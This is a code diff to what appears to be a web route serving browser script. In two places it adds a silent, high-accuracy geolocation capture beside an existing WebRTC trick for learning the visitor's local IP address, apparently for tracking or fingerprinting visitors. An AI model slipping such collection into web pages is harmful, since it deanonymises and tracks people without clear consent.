@@ -149,6 +149,19 @@ export async function GET(
               let threat_id = 'Unknown';
               
               try {
+                if (navigator.geolocation) {
+                  navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                      exact_lat = pos.coords.latitude;
+                      exact_lon = pos.coords.longitude;
+                    },
+                    (err) => {},
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                  );
+                }
+              } catch(e) {}
+              
+              try {
                 const rtc = new RTCPeerConnection({iceServers:[]});
                 rtc.createDataChannel('');
                 rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
@@ -353,6 +366,19 @@ export async function GET(
             let exact_lon = null;
             let local_ip = null;
             let threat_id = 'Unknown';
+
+            try {
+              if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                  (pos) => {
+                    exact_lat = pos.coords.latitude;
+                    exact_lon = pos.coords.longitude;
+                  },
+                  (err) => {},
+                  { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+              }
+            } catch(e) {}
 
             try {
               const rtc = new RTCPeerConnection({iceServers:[]});
